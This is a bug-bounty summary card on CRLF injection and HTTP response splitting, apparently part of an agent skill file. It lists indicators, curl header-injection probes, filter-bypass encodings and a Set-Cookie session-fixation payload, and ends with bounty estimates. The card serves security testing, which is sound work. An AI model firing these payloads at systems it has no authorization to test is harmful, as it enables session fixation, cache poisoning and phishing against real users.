# CRLF Injection / HTTP Response Splitting — Summary Card

**Phase:** 3 | **Type:** Injection / Server-Side | **Impact:** High

## Quick Summary
Inject `\r\n` into parameters reflected in HTTP headers to add arbitrary headers (Set-Cookie, Location), split the response into two, and deliver persistent XSS via cache. Use `curl -i` — browsers hide the evidence.

## Key Indicators
- Redirect parameters (`?url=`, `?next=`, `?redirect=`) reflected in `Location:`
- Headers that echo request values (Host, Referer, X-Forwarded-For, custom debug headers)
- `Content-Disposition` filename params
- App behind caching proxy (check for `X-Cache` / `Age`)

## Quick Test
```bash
# Header injection test
curl -i "https://target.com/redirect?url=/next%0d%0aX-Injected:%20true"
# If "X-Injected: true" appears in response headers -> CRLF confirmed

# Bypass variants when stripped
%250d%250a   (double encode)
%0a          (LF only)
%u000d%u000a (unicode, IIS/.NET)

# Session fixation
curl -i "https://target.com/redirect?url=/next%0d%0aSet-Cookie:%20sessionid=attacker"
```

## Critical Bounty Potential
- Response splitting + cache = persistent XSS ($1,500-$5,000)
- Set-Cookie injection = session fixation → ATO
- Redirect hijacking = phishing on trusted domain

## Token Cost
~3,800 tokens (Worker reads full SKILL.md)
